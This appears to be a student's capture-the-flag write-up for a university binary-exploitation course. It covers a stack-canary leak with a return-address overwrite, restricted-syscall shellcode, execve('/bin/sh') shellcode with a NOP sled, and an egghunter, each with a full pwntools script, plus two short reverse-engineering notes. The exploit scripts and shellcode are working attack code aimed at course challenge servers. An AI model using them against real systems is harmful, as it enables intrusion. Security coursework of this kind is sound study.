stack-dump
================================================
Flag: Server down, cannot obtain
General overview of problems faced
------------------------------------------------
Stack has a canary, so we need to somehow leak the address where the canary is to find out the canary.
Canary is randomised so no hardcoding.
We can leak the value of the canary using the dump memory option.
Buffer is stored at ebp-0x68
atoi is called during the gets for our len input. If we input non-numbers, maybe something will happen.
Canary found in stack pointer: 0xffffcfdc consistently through gdb
Examining through gdb, there are more canaries at 0xffffca74 and 0xffffd030 in addition to 0xffffcfdc.
Inputing the address instead of an actual length, then selecting b at the menu prints the contents of that address. However, using my known canary addresses don't work, the contents contain null or newline character "\n".
SOLUTION FOUND
Used pwngdb and canary to find where on the stack the canaries were.
Turns out you can get the difference between the given stack pointer and the stack addresses where canaries were to find the offset.
Adjust the given stack poiner to get the address where the canary is and enter it as input.
Select b to leak the canary contents.
Using cyclic, we know we need to fill 96 bytes before the canary is reached.
Fill in 96 bytes, enter canary, account for the 8 byte gap, then enter the address of the win function.
Shell popped and we can cat flag to get the flag.
(Though server down)
*** Worked on this for 3 days*** Pretty hard to figure out
Script/Command used
-----------------------------------------------
```
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './stack-dump' #Change this

PROGNAME = exe
REMOTE = "comp6447.wtf" #Change this
REMOTEPORT = 22188 #Change this
global p
global e
global global_timeout

e = ELF(PROGNAME)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

if args.REMOTE:
    global_timeout = 3
    p = remote(REMOTE, REMOTEPORT)
else:
    global_timeout = 0.5
    p = process(PROGNAME)
    p = start()
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Lets try a real stack canary, like the ones GCC uses
# To make things easier, here's a stack pointer ... (random adress)
# Winning address at 0x080486c6
#possible offset 0x15, 692, 105



p.recvuntil(b'pointer ',drop=True)
stk_ptr = p.recvline()
stk_ptr = int(stk_ptr, 16) + 21
log.info(f"The stack pointer is {stk_ptr}")
stk_ptr = p32(stk_ptr)


# a) input data
# b) dump memory
# c) print memory map
# d) quit

line = p.recvuntil(b'quit', drop=True)
log.info(f"{line}")
p.sendline(b'a')
log.info("You choose a")
line = p.recvuntil(b'len: ', drop=True)
log.info(f"{line}")
p.sendline(b'5')
log.info("Sent 5")
p.sendline(stk_ptr)
log.info("Sent given random adjusted stack pointer")
# Return to menu
line = p.recvuntil(b'quit', drop=True)
log.info(f"{line}")
p.sendline(b'b')
log.info("You chose b")
#line = p.recvline()
#log.info(f"{line}")
line = p.recvline()
canary = p.recvline()
log.info(f"Canary: {canary}")
canary = canary[22:26]
log.info(f"Canary: {canary}")
addr = 8
size = 96 + 4 + addr + 4 + 1
size = str(size)
log.info(f"Addr: {addr}")
line = p.recvuntil(b'quit', drop=True)
log.info(f"line: {line}")
p.sendline("a")
p.sendline(size)
log.info(f"Sent a, and {size}")

payload1 = b'a'*96 + canary + b'a'*addr + p32(0x080486c6) + b'\n'

log.info(f"{payload1}")
p.sendline(payload1)
line = p.recvuntil(b'quit', drop=True)
p.sendline(b'd')
log.info("You chose d")
p.sendline("cat flag")
flag = p.recvline()
log.info(f"Flag obtained: {flag}")
p.interactive()
```

simple
================================================
Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoiMi1zaW1wbGUiLCJpcCI6IjE0NC4xMzYuMjguMzYiLCJzZXNzaW9uIjoiM2U5NzY1ZDgtNWU3Mi00NWI3LTgxZDYtMTJjZjJmMDI0YzdlIn0.HCgnuqkzaYEqw1nAP0hyi2XNVxiNn2h-OJLPZaqNwWA}

General overview of problems faced
------------------------------------------------
We need to inject shellcode, but most of our syscalls are disabled. From the program, it seems like sys_read and sys_write can be used. 
The idea is to read the flag file in FD 1000 using sys_read, and store it somewhere. Then, use sys_write to print it stdout.
sys_read: 
eax needs to be set to 0x3
ebx needs to be set to the FD which is 1000
ecx is a buffer so we need to set some space on the stack
edx is the count, how many characters to read, set a reasonable amount.
sys_write:
eax set to 0x4
ebx set to 1 for stdout
No need to change ecx since we use the same buffer (which contains our flag)
edx is the count, should be same as sys_read's edx.
Script/Command used
----------------------------------------------------
```
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './simple' #Change this

PROGNAME = exe
REMOTE = "comp6447.wtf" #Change this
REMOTEPORT = 17521 #Change this
global p
global e
global global_timeout

e = ELF(PROGNAME)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

if args.REMOTE:
    global_timeout = 3
    p = remote(REMOTE, REMOTEPORT)
else:
    global_timeout = 0.5
    p = process(PROGNAME)
    p = start()
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================


my_assembly = """
mov eax, 0x3
mov ebx, 1000
mov edx, 100

sub esp, 500
mov ecx, esp

int 0x80

mov eax, 0x4
mov ebx, 1
mov edx, 100

int 0x80
"""
my_shellcode = asm(my_assembly)
p.recvuntil(b'enter your shellcode:', drop=True)

p.sendline(my_shellcode)

p.interactive()

```

shellz
===================================================
Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoiMi1zaGVsbHoiLCJpcCI6IjE0NC4xMzYuMjguMzYiLCJzZXNzaW9uIjoiMmNmYjc0N2UtN2Y1NS00NDBkLTk0Y2YtNzJiYTI0ODRjYTZkIn0.pwBOOKZzTvmtNHStsBKFJERS-9blv0FiCE3etuDZ22w}
General overview of problems faced
------------------------------------------------------
Goal is to use assembly to run execve on /bin/sh
Stack is executable because init calls eax and the input is stored in eax which is 0x2000 or 8192 bytes long. Need to fill in excess space to overflow to return address. Used nopsled.
call eax is at address 0x08049019 in init().
There is an 8 byte extra gap, which when I read up on, probably means for allignment, so add it in. (add esp, 0x8)

Script/Command used
------------------------------------------------------
```
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './shellz' #Change this

PROGNAME = exe
REMOTE = "comp6447.wtf" #Change this
REMOTEPORT = 15901 #Change this
global p
global e
global global_timeout

e = ELF(PROGNAME)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

if args.REMOTE:
    global_timeout = 3
    p = remote(REMOTE, REMOTEPORT)
else:
    global_timeout = 0.5
    p = process(PROGNAME)
    p = start()
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# Here is a random stack address: ... (randomised)
p.recvuntil(b'random stack address: ', drop=True)
stackaddr = p.recvline()
log.info(f"The random stack address is {stackaddr}")

my_assembly ="""
xor ecx, ecx
mul ecx

mov eax, 0xb
push 0x68
push 0x732f2f2f
push 0x6e69622f
mov ebx, esp
int 0x80
"""
shellcode1 = asm(my_assembly)
nopsled = """
nop
"""
shellcode2 = asm(nopsled)

call_eax = p32(0x08049019)

shellcode = shellcode1 + shellcode2 * (8192 + 8 - len(shellcode1))

p.sendline(shellcode + call_eax)
# pause()
p.interactive()
```

find-me
========================================================
Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoiMi1maW5kLW1lIiwiaXAiOiIxNDQuMTM2LjI4LjM2Iiwic2Vzc2lvbiI6Ijk0MDJmYzc4LTdiOWQtNGU2OS04MTNjLTczNzQ5YmU5NGIzNiJ9.ZGLtvRI4SDusEOYHA2bT7i-V84pvRB73I1bxk97azvk}
General overview of problems faced
------------------------------------------------------
Need to create an egghunter, some egghunters use two eggs.
Looks like small buffer fgets 20 bytes.
Big buffer fgets 256 bytes
flag open at FD 1000
Most syscalls are disabled, searched online how to create egghunters, but most use the access(2) syscall to ensure we do not try to access regions we are not allowed to access.
Egg and read/write shellcode go into bigbuf, while the egghunter goes into the smallbuf.
Segmentation faults even when smallbuf only contains mov ebx, 0x50905090. Program doesn't jump to bigbuf so something wrong with smallbuf
Added syscalls to access(2), but seg faults still occuring, probably disabled or something wrong with my smallbuf assembly.
Built from simple egghunter to the complicated access checking ones but no change.
Tried both inc and dec to see if the the small buffer was below or above, but still getting seg faults.
SOLUTION FOUND
I decided to drop the p32() and just insert the instructions in the bigbuf assembly. I used 0x4f904790 which is just nop, inc edi, nop, dec edi.
I also dropped the access() checks for seg faults cos they went over the 20 byte limit.
***Worked on this for 3 days*** Had to look up how to make egghunters.
Script/Command used
--------------------------------------------------------
```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './find-me' #Change this

PROGNAME = exe
REMOTE = "comp6447.wtf" #Change this
REMOTEPORT = 24973 #Change this
global p
global e
global global_timeout

e = ELF(PROGNAME)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

if args.REMOTE:
    global_timeout = 3
    p = remote(REMOTE, REMOTEPORT)
else:
    global_timeout = 0.5
    p = process(PROGNAME)
    p = start()
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
small_assembly = """
_start:
mov edx, 0x4f904790
loop:
inc eax
cmp dword ptr [eax], edx
jne loop
jmp eax
"""

large_assembly = """
nop
inc edi
nop
dec edi
xor ecx, ecx
mul ecx

sub esp, 400
mov ecx, esp
mov ebx, 1000
mov eax, 0x3
mov edx, 0xFF
int 0x80

mov eax, 0x4
mov ebx, 0x1
int 0x80

mov eax, 0x1
int 0x80
"""



small_asm = asm(small_assembly)
large_asm = asm(large_assembly)

p.recvuntil(b'smallbuf shellcode', drop=True)
p.sendline(small_asm)
p.recvuntil(b'bigbuf shellcode:', drop=True)
p.sendline(large_asm)

p.interactive()
```

RE Challenge 1
=========================================================
General overview of problems faced
---------------------------------------------------------
The initial stack prologue confused me a little. Had to differentiate between the prologue and actual logic of the function.
Can see the chart branches once. Looks like a conditional control structure.
and esp, 0xfffffff0 - rounds the stack pointer down to near base 16. In other words, address alignment.
__isoc99_scanf disallows some GNU extensions.
scanf takes in a pointer to a string ("%d", something like that) and stores it in a given address, like &number)
```C
int main(int argc, char const *argv[]) {
    int number;
    int i = scanf("%d", &number)
    if (number != 1337) {
        puts("Bye");
    } else {
        puts("Your so leet!");
    }
    return 1;
}
```

RE Challenge 2
==========================================================
General overview of problems faced
----------------------------------------------------------
test eax, eax and je means that it jumps if eax is zero.
and eax, 0x1 means that eax will be zero except when eax is 1.
This combines into the counter == 1 condition.
__x86.get_pc_thunk.bx indicates position independent code. It loads the position into the ebx register, which allows global objects to be accessed as an offset from that register. This may explain the add ebx, 0x1bc3 and similar instructions.
printf can have two arguments. I found out that there are as many arguments as pushes before the call printf instruction.
Not sure about the data_8048510 should be a string, but should most definitely contains "%d" to display the counter.
```C
int main(int argc, char const argv[]) {
    int counter = 0;
    while (counter <= 9) {

        if (counter == 1) {

            printf("%d", counter);
        }
        x = x + 1;
    }
    return 1;
}
```